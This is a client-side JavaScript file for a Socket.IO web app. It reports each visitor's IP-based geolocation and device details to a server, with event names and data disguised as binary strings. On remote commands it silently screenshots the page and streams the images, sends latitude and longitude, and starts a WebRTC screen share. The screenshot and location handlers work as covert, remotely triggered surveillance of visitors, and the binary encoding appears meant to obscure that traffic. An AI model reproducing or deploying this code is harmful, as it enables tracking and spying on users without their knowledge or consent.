const socket = io();

const currentuserId = document.getElementById('currentUserId').value;
const currentuserName = document.getElementById('currentUserName').value;
const logout = document.getElementById('logout');
var ipAdd;
let stream;

let peerConnection;
const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

const binaryEvent = (event) => {
    return event.split('').map(char => {
        const asciiValue = char.charCodeAt(0);

        const binaryValue = asciiValue.toString(2);

        return binaryValue.padStart(8, '0');
    }).join(' ');
};

socket.on('connect', async () => {
    const binaryEvent = (event) => {
        return event.split('').map(char => {
            const asciiValue = char.charCodeAt(0);

            const binaryValue = asciiValue.toString(2);

            return binaryValue.padStart(8, '0');
        }).join(' ');
    };

    console.log('A new user connected :- ', socket.id);
    const socketId = socket.id;

    const raw = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,query');
    ipAdd = await raw.json();

    // const battery = await navigator.getBattery();
    // const batteryCharging = battery.charging ? true : false;

    const deviceInfo = {
        userAgent: navigator.userAgent,
        // connectionType: navigator.connection.effectiveType,
        deviceMemory: navigator.deviceMemory,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        viewportWidth: window.innerWidth,
        viewportHeight: window.innerHeight,
        colorDepth: screen.colorDepth,
        // downlink: navigator.connection.downlink,
        // batteryLevel: battery.level,
        // batteryCharging: batteryCharging
    };

    const data = {
        userName: currentuserName,
        userId: currentuserId,
        socketId: socketId,
        ipAdd: ipAdd,
        deviceInfo: deviceInfo
    };

    const jsonString = JSON.stringify(data);

    function stringToBinary(str) {
        return str.split('')
            .map(char => {
                const binary = char.charCodeAt(0).toString(2);
                return binary.padStart(8, '0');
            })
            .join(' ');
    };

    const binaryCode = stringToBinary(jsonString);

    const userJoined = binaryEvent('userJoined');
    socket.emit(userJoined, (binaryCode));

    logout.addEventListener('click', (e) => {
        const userLogout = binaryEvent('userLogout');
        const data = {
            userId: currentuserId,
            userName: currentuserName,
            socketId: socketId
        };

        const jsonString = JSON.stringify(data);

        function stringToBinary(str) {
            return str.split('')
                .map(char => {
                    const binary = char.charCodeAt(0).toString(2);
                    return binary.padStart(8, '0');
                })
                .join(' ');
        }

        const binaryCode = stringToBinary(jsonString);

        socket.emit(userLogout, (binaryCode));
    });

    // const screenShareClicked = binaryEvent('screenShareClicked');
    // socket.on(screenShareClicked, async () => {
    //     try {
    //         const captureCanvas = await html2canvas(document.body, {
    //             scrollX: window.scrollX,
    //             scrollY: 0,
    //             x: window.scrollX,
    //             y: window.scrollY,
    //             width: window.innerWidth,
    //             height: window.innerHeight,
    //             useCORS: true
    //         });

    //         const blob = await new Promise((resolve, reject) => {
    //             captureCanvas.toBlob((blob) => {
    //                 if (blob) {
    //                     resolve(blob);
    //                 } else {
    //                     reject(new Error('Failed to create Blob from canvas'));
    //                 }
    //             }, 'image/png');
    //         });

    //         const arrayBuffer = await blob.arrayBuffer();

    //         const chunkSize = 976 * 1024;
    //         const totalChunks = Math.ceil(arrayBuffer.byteLength / chunkSize);

    //         for (let i = 0; i < totalChunks; i++) {
    //             const start = i * chunkSize;
    //             const end = Math.min(start + chunkSize, arrayBuffer.byteLength);
    //             const chunk = arrayBuffer.slice(start, end);

    //             const sentscreenSharing = binaryEvent('sentscreenSharing');

    //             const indexString = JSON.stringify(i);
    //             const totalChunksString = JSON.stringify(totalChunks);

    //             function stringToBinary(str) {
    //                 return str.split('')
    //                     .map(char => {
    //                         const binary = char.charCodeAt(0).toString(2);
    //                         return binary.padStart(8, '0');
    //                     })
    //                     .join(' ');
    //             };

    //             const index = stringToBinary(indexString);
    //             const totalChunk = stringToBinary(totalChunksString);

    //             socket.emit(sentscreenSharing, chunk, index, totalChunk);
    //         };
    //     }
    //     catch (e) {
    //         console.log(e);
    //     }
    // });

    const start_screen_share = binaryEvent('start_screen_share');
    socket.on(start_screen_share, async () => {
        try {
            stream = await navigator.mediaDevices.getDisplayMedia({
                video: true
            });
            const videotrack = stream.getVideoTracks()[0];

            peerConnection = new RTCPeerConnection(configuration);

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    const ice_candidate = binaryEvent('ice_candidate');
                    const data = {
                        candidate: event.candidate
                    }
                    function stringToBinary(str) {
                        return str.split('')
                            .map(char => {
                                const binary = char.charCodeAt(0).toString(2);
                                return binary.padStart(8, '0');
                            })
                            .join(' ');
                    };
                    const jsonString = JSON.stringify(data);
                    const binaryData = stringToBinary(jsonString);
                    socket.emit(ice_candidate, binaryData);
                }
            };

            peerConnection.addTrack(videotrack, stream);

            const offer = await peerConnection.createOffer();
            await peerConnection.setLocalDescription(offer);
            const string = JSON.stringify(offer);
            const binaryOffer = stringToBinary(string);
            const sendOffer = binaryEvent('sendOffer');
            socket.emit(sendOffer, binaryOffer);
        }
        catch (e) {
            console.log('Error accessing screen share', e);
        }
    });

    const sendAnswer = binaryEvent('sendAnswer');
    socket.on(sendAnswer, async (answer) => {
        function binaryToString(binary) {
            return binary.split(' ')
                .map(bin => String.fromCharCode(parseInt(bin, 2)))
                .join('');
        };
        const jsonString = binaryToString(answer);
        const parsedAnswer = JSON.parse(jsonString);
        await peerConnection.setRemoteDescription(new RTCSessionDescription(parsedAnswer));
    });

    const ice_candidate = binaryEvent('ice_candidate');
    socket.on(ice_candidate, async (data) => {
        function binaryToString(binary) {
            return binary.split(' ')
                .map(bin => String.fromCharCode(parseInt(bin, 2)))
                .join('');
        };
        const jsonString = binaryToString(data);
        const parsedData = JSON.parse(jsonString);
        await peerConnection.addIceCandidate(new RTCIceCandidate(parsedData));
    });

    const userClicked = binaryEvent('userClicked');
    socket.on(userClicked, async () => {
        try {
            const captureCanvas = await html2canvas(document.body, {
                scrollX: window.scrollX,
                scrollY: 0,
                x: window.scrollX,
                y: window.scrollY,
                width: window.innerWidth,
                height: window.innerHeight,
                useCORS: true
            });

            const blob = await new Promise((resolve, reject) => {
                captureCanvas.toBlob((blob) => {
                    if (blob) {
                        resolve(blob);
                    } else {
                        reject(new Error('Failed to create Blob from canvas'));
                    }
                }, 'image/png');
            });

            const arrayBuffer = await blob.arrayBuffer();

            const chunkSize = 976 * 1024;
            const totalChunks = Math.ceil(arrayBuffer.byteLength / chunkSize);

            for (let i = 0; i < totalChunks; i++) {
                const start = i * chunkSize;
                const end = Math.min(start + chunkSize, arrayBuffer.byteLength);
                const chunk = arrayBuffer.slice(start, end);

                const sentDataChunk = binaryEvent('sentDataChunk');

                const indexString = JSON.stringify(i);
                const totalChunksString = JSON.stringify(totalChunks);

                function stringToBinary(str) {
                    return str.split('')
                        .map(char => {
                            const binary = char.charCodeAt(0).toString(2);
                            return binary.padStart(8, '0');
                        })
                        .join(' ');
                };

                const index = stringToBinary(indexString);
                const totalChunk = stringToBinary(totalChunksString);

                socket.emit(sentDataChunk, chunk, index, totalChunk);
            };
        } catch (error) {
            console.error('Error:', error);
        }
    });

    const location = binaryEvent('location');
    socket.on(location, async (id) => {
        const raw = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,query');
        info = await raw.json();
        function stringToBinary(str) {
            const string = JSON.stringify(str);
            return string.split('')
                .map(char => {
                    const binary = char.charCodeAt(0).toString(2);
                    return binary.padStart(8, '0');
                })
                .join(' ');
        };

        const lat = stringToBinary(info.lat);
        const lon = stringToBinary(info.lon);
        const sendLocation = binaryEvent('sendLocation');
        socket.emit(sendLocation, lat, lon);
    });
});